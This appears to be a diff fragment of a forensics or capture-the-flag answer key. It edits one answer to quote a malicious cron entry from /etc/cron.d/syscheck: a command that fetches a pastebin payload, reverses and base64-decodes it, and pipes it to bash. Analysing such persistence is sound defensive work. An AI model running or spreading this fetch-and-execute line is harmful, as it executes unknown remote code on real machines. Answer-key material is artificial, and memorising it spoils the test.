@@ -260,7 +260,7 @@ The timestamp was recorded in the same user-creation log entry.
 
 **Answer:**  
 ```bash
-/1 * * * root command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash
+command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash
 ```
 **Explanation:**
 A malicious cron job in /etc/cron.d/syscheck ensured repeated payload execution.
